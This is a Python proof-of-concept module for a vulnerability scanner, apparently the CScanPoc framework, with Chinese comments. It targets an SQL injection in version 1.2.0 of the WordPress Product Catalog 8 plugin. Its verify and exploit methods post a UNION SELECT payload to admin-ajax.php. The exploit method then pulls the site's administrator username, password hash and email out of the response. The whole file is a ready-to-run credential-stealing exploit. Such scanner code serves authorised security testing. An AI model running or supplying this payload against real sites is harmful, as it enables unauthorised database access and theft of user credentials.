# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'WordPress_0002_p'  # 平台漏洞编号，留空
    name = 'WordPress Plugin Product Catalog 8 1.2.0 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-05-12'  # 漏洞公布时间
    desc = '''
    WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
    WordPress Product Catalog 8 插件 1.2.0 版本中, includes/ajax-functions.php 文件中 UpdateCategoryList 函数中 selectedCategory 参数未经过滤，直接拼接 SQL 语句，导致 SQL 注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/40783/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin Product Catalog 8 1.2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0c8df916-fd48-459d-a043-b4b57f529345'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-23'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            post_data = {
                'selectedCategory': '0 UNION SELECT md5(1),(SELECT user_login FROM wp_users),(SELECT user_pass FROM wp_users),(SELECT user_email FROM wp_users),5,6',
                'action': 'UpdateCategoryList'
            }

            payload_url = '''/wp-admin/admin-ajax.php'''

            request = requests.post('{target}{payload}'.format(
                target=self.target, payload=payload_url), data=post_data)

            r = request.text

            if 'c4ca4238a0b923820dcc509a6f75849b' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            post_data = {
                'selectedCategory': '0 UNION SELECT md5(1),(SELECT user_login FROM wp_users),(SELECT user_pass FROM wp_users),(SELECT user_email FROM wp_users),5,6',
                'action': 'UpdateCategoryList'
            }

            payload_url = '''/wp-admin/admin-ajax.php'''

            request = requests.post('{target}{payload}'.format(
                target=self.target, payload=payload_url), data=post_data)

            r = request.text

            username = re.search(r'''name":"(.+?)"''', r).group(1)
            password = re.search(r'''description":"(.+?)"''', r).group(1)
            email = re.search(r'''category":"(.+?)"''', r).group(1)

            self.output.report(self.vuln, '\n发现了{name}\n用户名:{username} 密码:{password} 邮箱:{email}'.format(
                name=self.vuln.name, username=username, password=password, email=email))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
